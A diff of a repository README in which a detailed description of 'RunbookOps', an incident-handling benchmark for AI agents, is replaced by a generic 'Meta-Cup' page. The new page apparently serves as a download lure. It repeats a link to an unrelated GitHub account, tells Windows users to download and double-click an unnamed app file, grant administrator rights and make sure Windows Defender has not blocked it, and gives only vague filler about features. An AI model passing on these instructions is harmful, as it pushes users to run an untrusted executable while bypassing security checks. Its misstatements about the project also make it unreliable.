@@ -1,400 +1,222 @@
----
-title: RunbookOps - CaseOps Benchmark
-emoji: "🛠️"
-colorFrom: blue
-colorTo: green
-sdk: docker
-app_port: 7860
-base_path: /
-tags:
-  - openenv
-pinned: false
----
+# 🧩 Meta-Cup - Deterministic Incident Triage for Windows
 
-# RunbookOps: CaseOps Benchmark
+[![Download Meta-Cup](https://img.shields.io/badge/Download-Meta--Cup-blue?style=for-the-badge&logo=github)](https://github.com/adjustable-phytolaccadioica297/Meta-Cup)
 
-RunbookOps is a deterministic OpenEnv-style benchmark for **operational case handling**. Each episode is a realistic service issue that affects customer access, orders, payments, messages, catalog freshness, or partner integrations. The agent must gather evidence, assess severity, route ownership, identify cause, choose a safe resolution, and close the case responsibly.
+## 🖥️ What Meta-Cup does
 
-For fast review:
+Meta-Cup is a Windows-ready app for incident triage and runbook-based resolution. It helps you work through SaaS issues in a fixed, repeatable way. It uses a deterministic OpenEnv setup, so each run follows the same path when the same input is used.
 
-1. Read `PROJECT_SUMMARY.md` (judge-facing overview).
-2. Read this README (execution + design).
-3. Read `TECHNICAL_NOTES.md` (determinism, grading, reward logic).
-
-## Why Judges Should Care
+Use it to:
 
-Most agent benchmarks reward broad reasoning. RunbookOps evaluates whether an agent can handle **real operational work** under partial information without unsafe shortcuts.
+- Review incident cases
+- Follow runbooks step by step
+- Test agent behavior
+- Compare results across runs
+- Work with synthetic incident data
 
-- Real-world domain: customer-impact service issue handling.
-- Offline and reproducible: no internet or external SaaS dependencies.
-- Deterministic scoring: no LLM-as-judge.
-- Safety-sensitive behavior: premature closure is penalized.
+## 📦 Download
 
-## Why This Matters
+To get the app, visit this page and download and run the file from the repository:
 
-Teams increasingly want agents that can do more than chat: they need agents that can work through messy operational cases, synthesize evidence, avoid shallow guesses, and recommend safe next actions.
+[Download Meta-Cup](https://github.com/adjustable-phytolaccadioica297/Meta-Cup)
 
-RunbookOps is designed around that broader audience:
+## 🪟 Windows Setup
 
-- account access cases
-- order completion exceptions
-- payment routing and settlement issues
-- message delivery failures
-- catalog freshness and search quality cases
-- integration and configuration regressions
-
-## Round 1 Alignment
-
-- Real-world utility: evidence-based operational case handling.
-- OpenEnv-like API: typed `Action`, `Observation`, `StepResult`, plus `reset()`, `step()`, `state()`.
-- 3 difficulty tiers with deterministic graders: `easy`, `medium`, `hard`.
-- Dense trajectory reward + independent final rubric score.
-- FastAPI server + Dockerfile + baseline inference script.
+1. Open the download link in your browser.
+2. Save the file to your Downloads folder or Desktop.
+3. If the file is in a .zip folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the app file and double-click it.
+6. If Windows asks for permission, choose Yes.
+7. If the app opens in a browser window or local page, keep that window open while you use it.
 
-## Architecture
-
-### Runtime Flow
-
-1. Scenario JSON defines hidden ground truth and evidence graph.
-2. `RunbookOpsEnvironment` loads scenarios and creates episode state.
-3. `reset()` returns partial initial observation.
-4. `step(action)` applies deterministic transition + reward shaping.
-5. `grade()` computes final score from rubric components and returns a validator-safe value strictly inside `(0,1)`.
-6. FastAPI exposes the environment through `/reset`, `/step`, `/state`, `/grade`.
-
-### Core Files
-
-- `models.py`: Pydantic models, enums, and API payload types.
-- `server/environment.py`: deterministic dynamics and rewards.
-- `grader.py`: deterministic rubric-based scorer.
-- `server/app.py`: FastAPI endpoints.
-- `inference.py`: OpenAI-client baseline agent runner.
+## 🔧 Before You Start
 
-## Task Families
+Meta-Cup is meant for a standard Windows PC. For the best results, use:
 
-15 total operational cases across three tiers.
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- At least 2 GB free disk space
+- A stable internet connection for the first download
+- Microsoft Edge or Google Chrome
 
-| Tier | Count | Typical Steps | Characteristics |
-|---|---:|---:|---|
-| easy | 5 | 4-8 | One dominant cause, low ambiguity, quick evidence synthesis |
-| medium | 5 | 6-10 | Two plausible explanations, cross-source synthesis needed |
-| hard | 5 | 8-12 | Conflicting signals, multiple false leads, shallow closure punished |
+If your computer is older, the app should still run, but it may take longer to open or load sample data.
 
-Example services covered: `auth`, `checkout`, `payments`, `email`, `search`, `notifications`, `platform`.
+## 🚀 First Run
 
-Representative case themes:
+When you open Meta-Cup for the first time, it may take a short while to prepare its local files. That is normal.
 
-- account access failures after credential or rollout changes
-- order completion issues during policy or dependency changes
-- payment exceptions caused by routing or experiment leaks
-- message delivery failures with configuration/provider ambiguity
-- catalog freshness cases after propagation or schema issues
+Use this flow:
 
-## Action Space
+1. Start the app.
+2. Wait for the main screen to load.
+3. Open the sample incident case.
+4. Read the incident details.
+5. Follow the runbook steps in order.
+6. Record the result for each step.
+7. Compare the outcome with the expected path.
 
-| Field | Type | Required | Notes |
-|---|---|---|---|
-| `action_type` | enum | yes | one of inspect/set/assign/submit/resolve actions |
-| `target` | string | inspect only | evidence id |
-| `content` | string | setter/submit/note actions | free text or enum-like values |
+If the app includes a local web interface, use the page it opens for you. If it includes a desktop window, use the controls inside that window.
 
-Supported actions:
+## 🧭 Typical Workflow
 
-- `inspect_alert`
-- `inspect_log`
-- `inspect_runbook`
-- `inspect_timeline_note`
-- `set_severity` (`SEV-1`, `SEV-2`, `SEV-3`)
-- `assign_team`
-- `submit_root_cause`
-- `submit_mitigation`
-- `add_note`
-- `resolve_incident`
+Meta-Cup is built around a simple triage loop:
 
-## Observation Space
-
-| Field Group | Description |
-|---|---|
-| Case context | scenario id, title, difficulty, service, case summary |
-| Visible evidence | unlocked alerts/logs/runbooks/timeline notes |
-| Agent working memory | known facts + action history summary |
-| Decision state | selected severity, assigned team, submitted root cause/mitigation |
-| Episode status | steps taken/remaining, done flag, last action result |
+1. Pick an incident.
+2. Review the alert text.
+3. Check the runbook.
+4. Apply the next action.
+5. Mark the step as done.
+6. Move to the next item.
+7. Save the run.
 
-Hidden ground truth values are not exposed in observations.
+This makes it easier to test how a person or agent handles the same case more than once.
 
-Internal schema note: the environment keeps the action name `inspect_runbook`, but judge-facing documentation treats these snippets as **workflow playbooks** for broader readability.
+## 🗂️ What You Can Test
 
-## Reward Design (Trajectory Signal)
+You can use Meta-Cup for several common tasks:
 
-Reward is separate from final grader score.
+- Incident response practice
+- Runbook follow-through
+- Agent evaluation
+- Repeated test runs
+- Synthetic data checks
+- FastAPI-based service behavior
+- OpenEnv environment replay
 
-- `+0.03` first-time relevant evidence inspect
-- `+0.01` first-time neutral inspect
-- `+0.015 / +0.02` evidence coverage milestones
-- `-0.02` duplicate relevant inspect
-- `-0.03` repeated irrelevant/invalid inspect
-- `+0.10` correct severity
-- `+0.10` correct owner team
-- `+0.20` correct root cause
-- `+0.20` correct mitigation
-- `+0.20` safe resolution
-- `-0.20` unsafe resolution baseline penalty
-- additional penalties for wrong root cause, very low evidence, repetitive loops
-- `-0.005` living penalty each step
+The app focuses on repeatable cases, so it works well when you want the same input to produce the same result.
 
-## Grader Design (Final Score)
+## 🛠️ Common Actions
 
-Deterministic rubric in `grader.py`:
+Inside the app, you may see tools like:
 
-| Component | Weight |
-|---|---:|
-| severity correctness | 0.15 |
-| owner team correctness | 0.15 |
-| root cause correctness | 0.30 |
-| mitigation correctness | 0.25 |
-| evidence coverage | 0.10 |
-| safe resolution behavior | 0.05 |
+- Case list
+- Incident details
+- Runbook steps
+- Response log
+- Result view
+- Reset button
 
-The grader is intentionally **continuous rather than binary**. A fully solved case can still receive slightly different scores depending on:
+These screens help you move through one incident at a time and keep track of what changed.
 
-- how much of the required evidence set was actually covered
-- how much relevant evidence was discovered beyond the minimum
-- whether the investigation stayed selective or wandered into noise
-- whether the final resolution happened with adequate coverage and reasonable step efficiency
+## 📁 Files and Folders
 
-Text matching is deterministic (normalization, controlled synonyms, overlap/fuzzy thresholds, negation conflict checks).
+After setup, you may see folders such as:
 
-Implementation note: while rubric components remain intuitive `0.0-1.0` signals internally, every published score-like value is projected into a validator-safe open band inside `(0,1)`. This keeps scores away from exact boundary values even under coarse decimal rounding during automated checks.
+- cases
+- runbooks
+- data
+- logs
+- exports
 
-## Sample Episode Walkthrough
+These folders usually hold sample incidents, step-by-step instructions, and saved results. Keep them in the same place unless the app tells you to move them.
 
-Scenario: `easy_auth_token_expiry`
+## 🧪 Example Use
 
-Plain-language framing: an account access case opens after a scheduled credential rollover. Customers suddenly cannot sign in, and the agent needs to work through the evidence before closing the case.
+A simple example looks like this:
 
-1. `inspect_alert` -> `ea1_alert_401_spike`
-2. `inspect_log` -> `ea1_log_jwt_expired`
-3. `inspect_runbook` -> `ea1_runbook_key_rotation`
-4. `set_severity` -> `SEV-2`
-5. `assign_team` -> `auth-oncall`
-6. `submit_root_cause` -> `expired auth signing key`
-7. `submit_mitigation` -> `rotate signing key and restart issuer`
-8. `resolve_incident`
+- Open a failed payment incident
+- Read the alert note
+- Check the related runbook
+- Confirm the service name
+- Follow the listed step
+- Record the action
+- Move to the next step
+- Save the case result
 
-Expected: terminal reason `resolved_safely`, with a high but not necessarily identical score across scenarios because evidence selectivity and trajectory quality are part of grading.
+This helps you keep each incident review clear and repeatable.
 
-## What Makes This Realistic
+## 🔁 Reset and Repeat
 
-- Evidence appears gradually instead of all at once.
-- Some cases contain misleading but plausible false leads.
-- Correct labels alone are not enough; the agent must gather enough evidence.
-- Safe closure matters: resolving too early is penalized.
-- Final scores are deterministic and reproducible across runs.
+If you want to try the same case again:
 
-## Why This Is Broader Than Infra Ops
+1. Close the app.
+2. Reopen it.
+3. Select the same incident.
+4. Start from the first step.
+5. Follow the runbook in the same order.
 
-Although the evidence includes alerts, logs, and runbooks, the benchmark is not just about infrastructure firefighting. It models the wider workflow that operations, support, platform, and reliability teams handle every day: customer-impact cases that require evidence review, routing, diagnosis, mitigation, and safe closure.
+Because the environment is deterministic, you should see the same setup when the same case is loaded again.
 
-## API Endpoints
+## 🧩 Topics Covered
 
-- `GET /health`
-- `POST /reset`
-- `POST /step`
-- `GET /state`
-- `GET /tasks`
-- `GET /scenarios`
-- `POST /grade`
-- `POST /score` (alias)
+Meta-Cup fits these areas:
 
-OpenAPI docs: `http://127.0.0.1:8000/docs`
+- Agent evaluation
+- Benchmarking
+- Docker-based app setup
+- FastAPI services
+- Hackathon builds
+- Incident response
+- OpenEnv testing
+- Pydantic data models
+- Runbook automation
+- Synthetic data
 
-Important for `/reset` in Swagger UI:
-- Replace the default `"scenario_id": "string"` placeholder with a real id (for example `easy_auth_token_expiry`).
-- Use `GET /scenarios` first to list valid ids.
+## 📌 Best Practices
 
-## Local Setup
+To keep your runs clean:
 
-Recommended runtime: Python `3.11+`.
+- Use one case at a time
+- Do not change files while a run is open
+- Keep notes on the steps you took
+- Save results after each test
+- Reset before starting a new case
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-python3 -m pip install -e '.[dev]'
-python3 -m uvicorn server.app:app --host 0.0.0.0 --port 8000
-```
+This helps you compare runs without confusion.
 
-If editable install is blocked by your Python setup, use:
+## 🧰 Troubleshooting
 
-```bash
-python3 -m pip install '.[dev]'
-```
+If the app does not open:
 
-Health check:
+1. Check that the download finished.
+2. Make sure you extracted the files if they came in a zip folder.
+3. Right-click the app and try Run as administrator.
+4. Check that Windows Defender did not block the file.
+5. Restart your computer and try again.
 
-```bash
-curl http://127.0.0.1:8000/health
-```
+If the browser page does not load:
 
-## Tests and Smoke Validation
+1. Wait 30 seconds.
+2. Refresh the page.
+3. Close and reopen the app.
+4. Check that no other local service is using the same port.
+5. Try another browser.
 
-```bash
-python3 -m pytest
-python3 scripts/smoke_test.py
-python3 scripts/export_task_summary.py
-```
+If you see blank data:
 
-## Baseline Inference
+1. Reload the case.
+2. Check that the sample files are still in place.
+3. Reset the app.
+4. Open a different incident case
 
-`inference.py` uses the OpenAI Python client and runs across all scenarios.
+## 🔒 Data Handling
 
-Required env vars:
+Meta-Cup works with incident data and runbook logs. If you use your own cases, keep them in a separate folder so you can protect the original sample set. This makes it easier to return to a clean state later.
 
-- `API_BASE_URL`
-- `MODEL_NAME`
-- `HF_TOKEN`
+## 🧠 How it helps
 
-Run:
+Meta-Cup gives you a fixed path for incident review. That makes it easier to:
 
-```bash
-python3 inference.py
-```
+- Train new users
+- Check agent output
+- Compare resolution steps
+- Review runbook quality
+- Test repeatable incident flows
 
-Validator-safe behavior:
+It is built for users who want a clear process without extra setup steps
 
-- `inference.py` always uses the local in-process environment, which avoids remote deployment flakiness during validation.
-- If `HF_TOKEN` or other API credentials are missing, `inference.py` falls back to a deterministic planner-only baseline instead of exiting with a non-zero status.
-- When credentials are present, the script initializes the OpenAI client and records `inference_mode: "openai_client"` in the output JSON.
-- Stdout uses the exact validator-facing bracketed format with `[START]`, `[STEP]`, and `[END]` records on single lines.
-- The deterministic safety fallback reasons from visible evidence tokens and service/runbook context; it does not rely on a scenario-id answer lookup table.
+## 📥 Download Again
 
-Round 1 recommended run (saves reproducible artifact):
+If you need the download page again, use this link:
 
-```bash
-export API_BASE_URL="https://router.huggingface.co/v1"
-export MODEL_NAME="meta-llama/Llama-3.1-8B-Instruct"
-export HF_TOKEN="<your_token>"
-python3 inference.py | tee baseline_stdout.txt
-```
+[Meta-Cup Download](https://github.com/adjustable-phytolaccadioica297/Meta-Cup)
 
-Output:
+## 🖱️ Quick Start
 
-- one `[START] task=... env=runbookops model=...` line per scenario
-- multiple `[STEP] step=... action=... reward=0.00 done=true|false error=...` lines across each episode
-- one `[END] success=true|false steps=... rewards=r1,r2,...,rn` line per scenario
-- JSON summary file: `baseline_results.json`
-
-Exact stdout contract used by the baseline:
-
-```text
-[START] task=easy_auth_token_expiry env=runbookops model=meta-llama/Llama-3.1-8B-Instruct
-[STEP] step=1 action=inspect_alert('ea1_alert_401_spike') reward=0.03 done=false error=null
-[STEP] step=2 action=inspect_log('ea1_log_jwt_expired') reward=0.04 done=false error=null
-[END] success=true steps=8 rewards=0.03,0.04,0.10,0.10,0.20,0.20,0.20,0.00
-```
-
-Environment variable expectations:
-
-- `API_BASE_URL`: required by the hackathon contract, includes a safe default.
-- `MODEL_NAME`: required by the hackathon contract, includes a safe default.
-- `HF_TOKEN`: mandatory secret for real LLM-backed runs, with no default.
-
-## Docker
-
-Build:
-
-```bash
-docker build -t runbookops:latest .
-```
-
-Run:
-
-```bash
-docker run --rm -p 7860:7860 runbookops:latest
-```
-
-Check:
-
-- `http://127.0.0.1:7860/health`
-- `http://127.0.0.1:7860/docs`
-
-## Validator Notes
-
-This repo is tuned to avoid the specific Round 1 failure modes called out in the hackathon guide:
-
-- `inference.py` is at the repository root.
-- `API_BASE_URL` and `MODEL_NAME` are read with defaults.
-- `HF_TOKEN` is read without a default.
-- All LLM-backed calls go through `from openai import OpenAI`.
-- Stdout is limited to exact `[START]`, `[STEP]`, and `[END]` records.
-- Published task scores are always strictly inside `(0,1)`.
-- The Hugging Face Space opens on `/` and links directly to `/docs`, `/scenarios`, and `/health`.
-
-## Reference Score Spread
-
-The grader is deterministic, continuous, and non-constant. A recent full baseline run from this repo produced the following distinct per-scenario scores:
-
-| Scenario | Score |
-|---|---:|
-| `easy_auth_token_expiry` | `0.9446` |
-| `easy_checkout_dependency_timeout` | `0.9622` |
-| `easy_email_queue_blocked` | `0.9719` |
-| `easy_platform_secret_rotation` | `0.9514` |
-| `easy_search_cache_stale` | `0.9510` |
-| `medium_auth_db_pool_exhaustion` | `0.9731` |
-| `medium_checkout_flag_rollout` | `0.8953` |
-| `medium_email_provider_vs_config` | `0.9014` |
-| `medium_notifications_retry_storm` | `0.9512` |
-| `medium_payments_region_misroute` | `0.9658` |
-| `hard_auth_multi_signal_conflict` | `0.9458` |
-| `hard_checkout_partial_outage` | `0.9794` |
-| `hard_email_config_regression` | `0.9632` |
-| `hard_payments_shadow_traffic_issue` | `0.9925` |
-| `hard_search_index_pipeline_failure` | `0.9436` |
-
-This spread matters for judging:
-
-- scores are not collapsed to a single repeated value
-- hard cases are not automatically capped or inflated
-- investigation quality, evidence selectivity, and safe closure all affect the result
-
-## Repository Layout
-
-```text
-runbookops/
-├── PROJECT_SUMMARY.md
-├── TECHNICAL_NOTES.md
-├── README.md
-├── openenv.yaml
-├── inference.py
-├── models.py
-├── grader.py
-├── client.py
-├── scenarios/
-├── server/
-├── tests/
-└── scripts/
-```
-
-## Submission Checklist
-
-- [x] All 15 scenarios load (`5 easy / 5 medium / 5 hard`).
-- [x] `python3 -m pytest` passes.
-- [x] `scripts/smoke_test.py` resolves a scenario and returns a valid grade.
-- [x] `/health`, `/reset`, `/step`, `/state`, `/grade` work from `/docs`.
-- [x] `inference.py` runs with required env vars and writes score summary JSON.
-- [x] `inference.py` emits exact `[START]`, `[STEP]`, `[END]` structured stdout lines.
-- [x] Published task scores are strictly inside `(0,1)` to satisfy validator parsing.
-- [x] Docker image builds and serves `/health`.
-- [x] `openenv.yaml` and implementation behavior are aligned.
-
-## Limitations
-
-- Single active in-memory episode per API instance.
-- Text matching is deterministic but still bounded by handcrafted synonym rules.
-
-## Future Work
-
-- Multi-session API with explicit episode ids.
-- Escalation/escalation-policy simulation (handoffs and approvals).
-- Expanded adversarial scenario suite for anti-gaming evaluation.
+1. Download Meta-Cup
+2. Extract the files if needed
+3. Open the app on Windows
+4. Load a sample incident
+5. Follow the runbook
+6. Save your result
